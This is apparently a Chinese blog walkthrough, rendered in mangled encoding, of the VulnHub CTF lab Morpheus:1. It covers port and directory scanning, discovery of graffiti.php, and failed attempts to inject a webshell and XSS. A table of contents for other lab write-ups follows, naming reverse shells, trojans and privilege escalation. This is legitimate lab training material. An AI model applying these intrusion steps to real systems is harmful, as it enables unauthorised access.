<p>æè¿°ï¼š<br><code>This is the second in the Matrix-Breakout series, subtitled Morpheus:1. Itâ€™s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.</code><br><code>Difficulty: Medium-Hard</code></p>
<p>è¿™æ˜¯ Matrix-Breakout ç³»åˆ—ä¸­çš„ç¬¬äºŒéƒ¨ï¼Œå‰¯æ ‡é¢˜ä¸º Morpheus:1ã€‚å®ƒçš„ä¸»é¢˜æ˜¯å›å½’ç¬¬ä¸€éƒ¨ Matrix ç”µå½±ã€‚æ‚¨æ‰®æ¼” Trinityï¼Œè¯•å›¾è°ƒæŸ¥ Nebuchadnezzar ä¸Šçš„ä¸€å°è®¡ç®—æœºï¼ŒCypher å·²å°†å…¶ä»–äººæ‹’ä¹‹é—¨å¤–ï¼Œè€Œè¿™å°è®¡ç®—æœºæŒæ¡ç€è§£å¼€è°œå›¢çš„é’¥åŒ™ã€‚<br>éš¾åº¦ï¼šä¸­ç­‰éš¾åº¦</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg" alt="æ‡¶äººåŒ…ã€‹ã€é§­å®¢ä»»å‹™ã€ç³»åˆ—é›»å½±å›é¡§ï¼Œ1 ~ 4 é›†è©³ç´°åŠ‡æƒ…ã€å¿ƒå¾— ..."></p>
<blockquote>
<p>wcç¡®å®æœ‰ä¸œè¥¿<br>å®åœ¨ä¸æ‡‚å¯ä»¥çœ‹è¿™ä¸ªç ”è®¨ä¼šè§†é¢‘<br><code>https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container</code><br>è™½ç„¶è¿™ä¸ªä¸æ˜¯è¿™ä¸ªé¶æœºçš„wpï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä»å…¶ä¸­è·å¾—å¾ˆå¤šæ€è·¯</p>
</blockquote>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>å…ˆæ‰«æä¸€ä¸‹ç«¯å£</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221117130716527.png" alt="image-20221117130716527"></p>
<blockquote>
<p>å‘ç°<code>22</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œç€<code>ssh</code><br><code>80ï¼Œ81</code>ä¸¤ä¸ªç«¯å£éƒ½è¿è¡Œç€<code>http</code><br>ä½†æ˜¯ä¸¤è€…åå­—ä¸åŒï¼Œå¯ä»¥åˆ¤æ–­å‡º<br>ä½†æ˜¯80ç«¯å£å¯ä»¥ä»»æ„è®¿é—®ï¼Œ<code>81</code>ç«¯å£è®¿é—®éœ€è¦ä¸€å®šæƒé™</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221117134302741.png" alt="image-20221117134302741"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°81ç«¯å£æ˜¯éœ€è¦ç™»å½•çš„</span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>dirsearch</code>æ‰«ä¸€ä¸‹ç›®å½•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221117130822881.png" alt="image-20221117130822881"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°ç½‘ç«™ç›®å½•ä¸‹æœ‰çˆ¬è™«åè®®ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹å…¶ä¸­æœ‰æ²¡æœ‰å…³é”®ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221117131146601.png" alt="image-20221117131146601"></p>
<blockquote>
<p><code>There&#39;s no white rabbit here.  Keep searching!</code><br>æ„æ€æ˜¯ï¼šè¿™é‡Œæ²¡æœ‰ç™½å…”ã€‚ç»§ç»­æœç´¢ï¼ </p>
<p>#<code>white rabbit</code>å°±æ˜¯çˆ±ä¸½ä¸æ¢¦æ¸¸ä»™å¢ƒé‡Œçš„ï¼Œè·Ÿç€ç™½è‰²çš„å…”å­ï¼Œæ‰è¿›å…”å­æ´</p>
<p>çœ‹æ¥æ˜¯æœ‰ä¸ªå¼•å¯¼çš„ä¿¡æ¯ï¼Œä¼šå¸¦æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå¾ˆå…³é”®çš„ä¸œè¥¿</p>
</blockquote>
<p>å†ç”¨<code>whatweb</code>æŸ¥çœ‹ç½‘ç«™å¯æ˜¾ç¤ºçš„æ¡†æ¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221117131950416.png" alt="image-20221117131950416"></p>
<p>æ²¡æœ‰å•¥ä¿¡æ¯</p>
<p>æˆ‘ä»¬è®¿é—®ç½‘ç«™çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221117131405964.png" alt="image-20221117131405964"></p>
<blockquote>
<p><code>Welcome to the Boot2Root CTF, Morpheus:1.</code></p>
<p><code>You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.</code></p>
<p><code>Good luck! - @jaybeale from @inguardians</code><br>æ„æ€æ˜¯ï¼š<br>æ¬¢è¿æ¥åˆ°Boot2Root CTFï¼Œå¢¨è²æ–¯:1.</p>
<p>ä½ æ‰®æ¼”<code>Trinity</code>ï¼Œè¯•å›¾è°ƒæŸ¥å°¼å¸ƒç”²å°¼æ’’åŠå²›ä¸Šçš„ä¸€å°ç”µè„‘ï¼Œ<code>Cypher</code>æŠŠæ‰€æœ‰äººéƒ½é”åœ¨å¤–é¢ï¼Œè‡³å°‘å¯¹äº<code>ssh</code>ã€‚</p>
<p>ç¥ä½ å¥½è¿ï¼ -@jaybealefrom@inguardians </p>
<p>#Cypherç”µå½±ä¸­åæŠ—ç»„ç»‡çš„ä¸€ä¸ªå›å¾’ï¼Œä»–æŠŠåæŠ—ç»„ç»‡é”åœ¨é—¨å¤–ï¼Œæˆ‘ä»¬åˆè¦ç”¨åˆ°ssh<br>é‚£çœ‹æ¥sshç™»å½•çš„ç”¨æˆ·åä¸ºCypher</p>
</blockquote>
<p>ä¿¡æ¯è¿˜æ˜¯å¤ªå°‘äº†ï¼Œ<code>dirsearch</code>åªæ‰«åˆ°ä¸¤ä¸ªå¯ä»¥è®¿é—®ï¼Œå®åœ¨åˆ©ç”¨å¤ªå°‘</p>
<p>æ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªæ‰«æå·¥å…·</p>
<h3><span id="dirbuster">dirbuster</span></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirBusteræ”¯æŒå…¨éƒ¨çš„Webç›®å½•æ‰«ææ–¹å¼ï¼Œç”¨æ¥æ¢æµ‹webæœåŠ¡å™¨ä¸Šçš„ç›®å½•å’Œéšè—æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘åˆ©ç”¨çš„æ˜¯</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists/</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221119232447671.png" alt="image-20221119232447671"></p>
<p>æˆ‘é€šè¿‡<code>dirbuster</code>å·¥å…·æ‰«æåˆ°</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>/graffiti.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221119232601421.png" alt="image-20221119232601421"></p>
<p>è®¿é—®</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>/graffiti.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221119234606473.png" alt="image-20221119234606473"></p>
<p>å‘ç°æ˜¯ä¸ªç•™è¨€ä¿¡æ¯çš„ä¸€ä¸ªç½‘ç«™</p>
<p>è€Œä¸”æˆ‘ä»¬è¯„è®ºçš„ä¿¡æ¯è¢«åŒ…å«åœ¨äº†<code>graffiti.php</code>æ–‡ä»¶ä¸­</p>
<p>æ‰€ä»¥æˆ‘çš„å¼€å§‹æ€è·¯æ˜¯åŒ…å«ä¸€å¥è¯ğŸ</p>
<p>ä½†æ˜¯æ’å…¥å¸¸è§„çš„<code>php</code>ğŸï¼Œä¼šè¢«ç ´å</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221119234929786.png" alt="image-20221119234929786"></p>
<p>æ•…æˆ‘ä»¬æ’å…¥<code>jsp</code>ä¸€å¥è¯ğŸè¯•è¯•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221119235019960.png" alt="image-20221119235019960"></p>
<p>å‘ç°æ’å…¥æˆåŠŸï¼Œä½†æ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½è¿ä¸Š</p>
<p>ç”¨èšå‰‘è¯•è¯•</p>
<p>ä½†å…¶å®æ˜¯è¿ä¸ä¸Šçš„ï¼Œ</p>
<p>åé¢æˆ‘åˆè¯•äº†è¯•<code>xss</code>ï¼Œè™½ç„¶æœ‰å¼¹çª—ä½†æ˜¯æ²¡å•¥ç”¨ï¼Œä¹Ÿæ˜¯ä¸è¡Œ</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98/">å®æˆ˜</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/01/%E5%98%89%E7%84%B6%E7%BE%8E%E7%85%A7%E6%8D%8F/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic2.zhimg.com/80/v2-f15c9426e18febfac5bde90270faf6a3_1440w.jpg?source=1940ef5c" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">ç„¶ç„¶ç¾ç…§æ</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/27/CTFHub-wp/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">CTFHub-wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/" title="CVEæ¼æ´"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-01-17</div><div class="title">CVEæ¼æ´</div></div></a></div><div><a href="/2022/11/22/SYC/" title="æ¼æ´æµ‹è¯•"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/20.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-01-17</div><div class="title">æ¼æ´æµ‹è¯•</div></div></a></div><div><a href="/2022/11/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="çº¢æ—¥é¶åœº"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-01-17</div><div class="title">çº¢æ—¥é¶åœº</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ç›®å½•</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">DCç³»åˆ—ã€1~9ã€‘(å®Œ)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ä¸€ã€DC-1[åˆçº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">msf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*äº¤äº’å¼shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">1ï¼‰ä¸ªäººæ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">2ï¼‰å®˜æ–¹æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">suidææƒ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">äºŒã€DC-2[åˆçº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">cewl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">wpscan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">rbash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*viç»•è¿‡-&gt;rbashé€ƒé€¸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*è®¾ç½®å…¨å±€å˜é‡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">Flag5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">*æ³¨æ„çª—å£å¤§å°</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text">1.çª—å£è¶³å¤Ÿå¤§</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text">2.çª—å£å°ä¸€äº›</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ä¸‰ã€DC-3[åˆçº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">john</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ³•1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">msfç”Ÿæˆæœ¨é©¬</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text">msfåˆ©ç”¨æœ¨é©¬</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text">ææƒ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ³•2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">åå¼¹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ³•3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">weevelyã€ææƒæ²¡å›æ˜¾ã€‘</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">å››ã€DC-4[åˆçº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">å¯†ç çˆ†ç ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">teehee</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">äº”ã€DC-5[é«˜çº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">æ–‡ä»¶åŒ…å«</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">2ï¼‰ncå‘½ä»¤åå¼¹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">*è·å¾—ç¨³å®šçš„shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">3.ææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text">*å‡ºç°æ„å¤–</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-text">ç»™cc1é…ç½®ç¯å¢ƒå˜é‡</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-text">å…³é”®æ¥äº†ã€æœŸå¾…ã€‘</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">å…­ã€DC-6[ä¸­çº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">2.wpscançˆ†ç ´å¯†ç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">2ï¼‰45274.html</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">ncç›‘å¬æ‹¿shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">4.nmapææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">1.æ—§ç‰ˆ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">2.æ–°ç‰ˆ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ä¸ƒã€DC-7[ä¸­çº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">1.è·³å‡ºæ¡†æ¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">2.sshç™»å½•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*å…³é”®æ€è·¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">3.drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">4.ç™»å½•ç½‘ç«™</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ·»åŠ phpæ‰§è¡Œæ’ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">åŠ å…¥ä¸€å¥è¯æœ¨é©¬</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">5.èšå‰‘è¿æ¥getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">6.åå¼¹shellæ‹¿www-data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">å…«ã€DC8[åˆçº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">1.sqlæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">2.åå°æ·»åŠ æœ¨é©¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">3.åå¼¹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">4.ææƒã€exim4ã€‘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">æ„å¤–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">p.s. setuid</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">åœ¨pwnä¸­</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ä¹ã€DC9[ä¸­çº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">1.sqlæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">2.æ–‡ä»¶åŒ…å«</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">3.ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">1ï¼‰ knockd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">2ï¼‰ hydra</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">4.ææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">pyè„šæœ¬åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">opensslåŠ ç›</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ELSE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">ä¸€ã€DEATHNOTE: 1[åˆçº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">*å…³é”®ä¿¡æ¯</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">1.wpscan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">ç™»å½•åå°</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">2.sshç™»å½•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">3.ç™»å½•kira</span></a></li><li class="toc-item toc-level-2"><a 